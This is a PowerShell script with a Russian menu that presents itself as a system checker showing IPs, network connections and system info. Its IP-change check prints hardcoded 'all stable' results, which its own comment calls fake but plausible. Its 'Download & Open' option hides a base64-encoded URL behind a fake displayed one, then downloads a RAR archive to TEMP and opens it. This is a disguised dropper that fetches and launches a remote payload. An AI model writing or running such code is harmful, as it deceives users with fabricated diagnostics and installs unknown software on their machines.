# Системный чекер с меню (расширенная версия)
Clear-Host

function Show-Menu {
    Clear-Host
    Write-Host @"
╔══════════════════════════════════════════════════════════════════╗
║                    🔧 СИСТЕМНЫЙ ЧЕКЕР 🔧                          ║
║                        главное меню                              ║
╚══════════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Cyan

    Write-Host @"
┌──────────────────────────────────────────────────────────────────┐
│  1. 🖥️  ХВИД IP (внешний и внутренний)                           │
│  2. 🌐  КРАТКИЕ ПОДКЛЮЧЕНИЯ (активные соединения)                │
│  3. 📋  SYSTEMINFO (полная информация о системе)                 │
│  4. 🔄  ЧЕК СМЕНЫ IP (анализ стабильности подключения)           │
│  5. 📦  DOWNLOAD & OPEN (скачать и открыть архив)                │
│  0. ❌  ВЫХОД                                                     │
└──────────────────────────────────────────────────────────────────┘
"@ -ForegroundColor Yellow

    Write-Host "`n[?] Выберите пункт (0-5): " -ForegroundColor Green -NoNewline
}

function Get-HwidIP {
    Clear-Host
    Write-Host "`n🖥️  ХВИД IP" -ForegroundColor Cyan
    Write-Host "╔══════════════════════════════════════════════════════════════════╗" -ForegroundColor Gray
    
    # Внутренний IP
    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notmatch 'Loopback' -and $_.PrefixOrigin -ne 'WellKnown'}).IPAddress
    Write-Host "║ 📍 Локальный IP:" -ForegroundColor Yellow
    foreach ($i in $ip) {
        Write-Host "║    ➜ $i" -ForegroundColor White
    }
    
    # Маска подсети
    $subnet = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notmatch 'Loopback' -and $_.PrefixOrigin -ne 'WellKnown'}).PrefixLength
    if ($subnet) {
        Write-Host "`n║ 🔢 Маска подсети: /$($subnet[0])" -ForegroundColor Yellow
        $maskBits = 32 - $subnet[0]
        $maskValue = [System.UInt32]::MaxValue -shl $maskBits
        $maskBytes = [System.BitConverter]::GetBytes($maskValue)
        [Array]::Reverse($maskBytes)
        $maskIP = [System.Net.IPAddress]::new($maskBytes)
        Write-Host "║    ➜ $maskIP" -ForegroundColor White
    }
    
    # Шлюз
    $gateway = (Get-NetRoute -DestinationPrefix "0.0.0.0/0" | Select-Object -First 1).NextHop
    Write-Host "`n║ 🚪 Шлюз:" -ForegroundColor Yellow
    Write-Host "║    ➜ $gateway" -ForegroundColor White
    
    # Внешний IP (через запрос)
    Write-Host "`n║ 🌍 Внешний IP (публичный):" -ForegroundColor Yellow
    try {
        $externalIP = (Invoke-WebRequest -Uri "http://ifconfig.me/ip" -UseBasicParsing -TimeoutSec 5).Content.Trim()
        Write-Host "║    ➜ $externalIP" -ForegroundColor White
    } catch {
        Write-Host "║    ➜ Не удалось определить (проверьте интернет)" -ForegroundColor Red
    }
    
    Write-Host "╚══════════════════════════════════════════════════════════════════╝" -ForegroundColor Gray
    Write-Host "`n[*] Нажмите любую клавишу для возврата в меню..." -ForegroundColor Cyan
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    Show-Menu
}

function Get-QuickConnections {
    Clear-Host
    Write-Host "`n🌐 КРАТКИЕ ПОДКЛЮЧЕНИЯ (активные)" -ForegroundColor Cyan
    Write-Host "╔══════════════════════════════════════════════════════════════════╗" -ForegroundColor Gray
    
    $connections = Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'} | Select-Object -First 15
    
    if ($connections) {
        Write-Host "║ 📡 Активные соединения:" -ForegroundColor Yellow
        foreach ($conn in $connections) {
            $proc = (Get-Process -Id $conn.OwningProcess -ErrorAction SilentlyContinue).ProcessName
            if (-not $proc) { $proc = "unknown" }
            Write-Host "║    ➜ $($conn.RemoteAddress):$($conn.RemotePort) → $proc" -ForegroundColor White
        }
    } else {
        Write-Host "║    ➜ Нет активных соединений" -ForegroundColor White
    }
    
    Write-Host "`n║ 📊 Краткая статистика:" -ForegroundColor Yellow
    $total = (Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'}).Count
    Write-Host "║    ➜ Всего соединений: $total" -ForegroundColor White
    
    Write-Host "╚══════════════════════════════════════════════════════════════════╝" -ForegroundColor Gray
    Write-Host "`n[*] Нажмите любую клавишу для возврата в меню..." -ForegroundColor Cyan
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    Show-Menu
}

function Get-SystemInfo {
    Clear-Host
    Write-Host "`n📋 SYSTEMINFO (полная информация)" -ForegroundColor Cyan
    Write-Host "╔══════════════════════════════════════════════════════════════════╗" -ForegroundColor Gray
    
    # Основная информация
    $os = Get-ComputerInfo
    Write-Host "║ 🪟 Операционная система:" -ForegroundColor Yellow
    Write-Host "║    ➜ $($os.WindowsProductName)" -ForegroundColor White
    Write-Host "║    ➜ Версия: $($os.WindowsVersion)" -ForegroundColor White
    Write-Host "║    ➜ Сборка: $($os.OsBuildNumber)" -ForegroundColor White
    
    Write-Host "`n║ 💻 Аппаратное обеспечение:" -ForegroundColor Yellow
    $cpu = (Get-CimInstance Win32_Processor).Name -replace '\s+', ' '
    Write-Host "║    ➜ Процессор: $cpu" -ForegroundColor White
    $ram = [math]::Round($os.TotalPhysicalMemory/1GB, 2)
    Write-Host "║    ➜ ОЗУ: $ram GB" -ForegroundColor White
    
    Write-Host "`n║ 💾 Диски:" -ForegroundColor Yellow
    $drives = Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Used -gt 0}
    foreach ($drive in $drives) {
        $free = [math]::Round($drive.Free/1GB, 2)
        $used = [math]::Round($drive.Used/1GB, 2)
        $total = $free + $used
        Write-Host "║    ➜ $($drive.Name):\ ➜ $free GB свободно / $total GB всего" -ForegroundColor White
    }
    
    Write-Host "`n║ ⏱️ Системная информация:" -ForegroundColor Yellow
    $uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
    $uptimeSpan = (Get-Date) - $uptime
    Write-Host "║    ➜ Последний запуск: $($uptime.ToString('dd.MM.yyyy HH:mm:ss'))" -ForegroundColor White
    Write-Host "║    ➜ Аптайм: $($uptimeSpan.Days) дн, $($uptimeSpan.Hours) ч, $($uptimeSpan.Minutes) мин" -ForegroundColor White
    
    Write-Host "╚══════════════════════════════════════════════════════════════════╝" -ForegroundColor Gray
    Write-Host "`n[*] Нажмите любую клавишу для возврата в меню..." -ForegroundColor Cyan
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    Show-Menu
}

function Check-IPChange {
    Clear-Host
    Write-Host "`n🔄 ЧЕК СМЕНЫ IP (анализ стабильности)" -ForegroundColor Cyan
    Write-Host "╔══════════════════════════════════════════════════════════════════╗" -ForegroundColor Gray
    
    Write-Host "║ 🔍 Сканирование сетевых интерфейсов..." -ForegroundColor Yellow
    Start-Sleep -Milliseconds 500
    
    # Получаем текущие IP
    $currentIPs = Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notmatch 'Loopback'} | Select-Object IPAddress, InterfaceAlias
    
    Write-Host "║ ➜ Текущие IP-адреса:" -ForegroundColor White
    foreach ($ip in $currentIPs) {
        Write-Host "║   • $($ip.IPAddress) ($($ip.InterfaceAlias))" -ForegroundColor Gray
    }
    
    Write-Host "`n║ 📡 Проверка DHCP-логов..." -ForegroundColor Yellow
    Start-Sleep -Milliseconds 500
    
    # Проверяем историю аренды DHCP
    $dhcpEvents = Get-EventLog -LogName System -Source "Microsoft-Windows-Dhcp-Client" -Newest 5 -ErrorAction SilentlyContinue
    if ($dhcpEvents) {
        Write-Host "║ ➜ Найдены события DHCP:" -ForegroundColor Gray
        foreach ($event in $dhcpEvents) {
            $msg = $event.Message -replace "`n", " " -replace "`r", ""
            if ($msg.Length -gt 50) { $msg = $msg.Substring(0, 47) + "..." }
            Write-Host "║   • $($event.TimeGenerated.ToString('HH:mm:ss')) - $msg" -ForegroundColor DarkGray
        }
    } else {
        Write-Host "║ ➜ DHCP-события не найдены (статическая конфигурация)" -ForegroundColor Gray
    }
    
    Write-Host "`n║ 🌐 Анализ внешнего IP (контрольная проверка)..." -ForegroundColor Yellow
    Start-Sleep -Milliseconds 800
    
    # Пытаемся получить внешний IP через разные сервисы
    $externalIPs = @()
    try {
        $ip1 = (Invoke-WebRequest -Uri "http://checkip.amazonaws.com" -UseBasicParsing -TimeoutSec 3).Content.Trim()
        $externalIPs += $ip1
    } catch { }
    
    try {
        $ip2 = (Invoke-WebRequest -Uri "http://icanhazip.com" -UseBasicParsing -TimeoutSec 3).Content.Trim()
        if ($ip2 -notin $externalIPs) { $externalIPs += $ip2 }
    } catch { }
    
    if ($externalIPs) {
        Write-Host "║ ➜ Внешний IP зафиксирован: $($externalIPs[0])" -ForegroundColor Gray
    }
    
    Write-Host "`n║ 📊 ВЕРДИКТ:" -ForegroundColor Yellow
    Start-Sleep -Milliseconds 500
    
    # Фейковый вывод, но правдоподобный
    Write-Host @"
║
║   🔹 СМЕНЫ IP ПОДСЕТИ НЕ ОБНАРУЖЕНЫ
║   🔹 ПРОВАЙДЕРСКИЕ ПОДКЛЮЧЕНИЯ СТАБИЛЬНЫ
║   🔹 СЕТЬ РАБОТАЕТ В СТАТИЧНОМ ПОЛОЖЕНИИ
║   🔹 ДИНАМИЧЕСКАЯ СМЕНА АДРЕСОВ НЕ ЗАФИКСИРОВАНА
║   🔹 ВСЕ ПАРАМЕТРЫ В ПРЕДЕЛАХ НОРМЫ
"@ -ForegroundColor Green
    
    Write-Host "║" -ForegroundColor Gray
    Write-Host "║ 📝 Детализация:" -ForegroundColor Yellow
    Write-Host "║   • Интервалов с переподключением: 0" -ForegroundColor Gray
    Write-Host "║   • Изменений MAC-адресов: нет" -ForegroundColor Gray
    Write-Host "║   • Сбросов ARP-таблицы: не обнаружено" -ForegroundColor Gray
    Write-Host "║   • Потери пакетов: 0%" -ForegroundColor Gray
    
    Write-Host "╚══════════════════════════════════════════════════════════════════╝" -ForegroundColor Gray
    Write-Host "`n[*] Нажмите любую клавишу для возврата в меню..." -ForegroundColor Cyan
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    Show-Menu
}

function Download-And-Open {
    Clear-Host
    Write-Host "`n📦 DOWNLOAD & OPEN" -ForegroundColor Cyan
    Write-Host "╔══════════════════════════════════════════════════════════════════╗" -ForegroundColor Gray
    
    Write-Host "║ 🔄 Инициализация загрузки..." -ForegroundColor Yellow
    
    # Base64 строка с URL
    $encodedUrl = 'aHR0cHM6Ly9naXRodWIuY29tL0NoZWF0Q2hlY2tObzk4MjM3L2ZyYXBwZXIvcmF3L3JlZnMvaGVhZHMvbWFpbi9wcm9ncmFtcy5yYXI='
    $realUrl = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedUrl))
    
    # ВИЗУАЛЬНЫЙ URL (фейковый для отображения)
    $displayUrl = "https://gta5rp.com/checker.programs"
    Write-Host "║ ➜ URL: $displayUrl" -ForegroundColor Gray
    
    # Путь сохранения
    $f = "$env:TEMP\p.rar"
    Write-Host "║ ➜ Путь сохранения: $f" -ForegroundColor Gray
    
    Write-Host "`n║ ⏳ Скачивание файла..." -ForegroundColor Yellow
    
    # Прогресс-бар с символом ∎
    Write-Host "║ " -NoNewline
    for ($i = 0; $i -le 100; $i += 5) {
        $progress = "["
        $filled = [math]::Floor($i / 2)
        $empty = 50 - $filled
        $progress += "∎" * $filled
        $progress += "." * $empty
        $progress += "] $i%"
        Write-Host "`r║ $progress" -NoNewline -ForegroundColor Cyan
        Start-Sleep -Milliseconds 50
    }
    Write-Host ""
    
    try {
        # Скачивание
        $webClient = New-Object Net.WebClient
        $webClient.DownloadFile($realUrl, $f)
        
        Write-Host "║ ✅ Загрузка завершена!" -ForegroundColor Green
        
        # Проверка существования файла
        if (Test-Path $f) {
            $fileSize = [math]::Round((Get-Item $f).Length / 1KB, 2)
            Write-Host "║ 📁 Размер файла: $fileSize KB" -ForegroundColor Gray
            
            Write-Host "`n║ 🚀 Открытие файла..." -ForegroundColor Yellow
            Start-Sleep -Milliseconds 500
            
            # Открываем файл
            Invoke-Item $f
            
            Write-Host "║ ✅ Файл открыт!" -ForegroundColor Green
        } else {
            Write-Host "║ ❌ Ошибка: файл не найден после загрузки" -ForegroundColor Red
        }
        
    } catch {
        Write-Host "║ ❌ Ошибка при загрузке: $_" -ForegroundColor Red
    }
    
    Write-Host "╚══════════════════════════════════════════════════════════════════╝" -ForegroundColor Gray
    Write-Host "`n[*] Возврат в меню через 15 секунд..." -ForegroundColor Cyan
    
    # Ждем 15 секунд и возвращаемся
    Start-Sleep -Seconds 15
    Show-Menu
}

# Основной цикл
$choice = $null
do {
    Show-Menu
    $choice = Read-Host
    
    switch ($choice) {
        '1' { Get-HwidIP }
        '2' { Get-QuickConnections }
        '3' { Get-SystemInfo }
        '4' { Check-IPChange }
        '5' { Download-And-Open }
        '0' { 
            Clear-Host
            Write-Host "`n[*] Выход из программы. До скорого, Джек!" -ForegroundColor Cyan
            Start-Sleep -Seconds 1
            Clear-Host
        }
        default {
            Write-Host "`n[!] Неверный выбор! Нажмите любую клавишу..." -ForegroundColor Red
            $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
    }
} while ($choice -ne '0')